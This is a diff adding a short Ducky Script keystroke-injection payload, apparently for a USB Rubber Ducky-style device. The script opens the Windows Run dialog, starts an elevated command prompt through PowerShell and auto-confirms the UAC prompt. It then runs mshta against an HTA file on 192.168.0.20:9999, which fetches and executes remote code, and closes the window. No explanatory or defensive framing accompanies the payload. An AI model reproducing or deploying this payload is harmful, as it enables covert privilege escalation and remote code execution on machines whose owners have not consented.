@@ -1,0 +1,13 @@
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell Start-Process cmd -Verb runAs
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 3000
+ALT y
+DELAY 4000
+STRING mshta http://192.168.0.20:9999/mish
+ENTER
+STRING exit
+ENTER
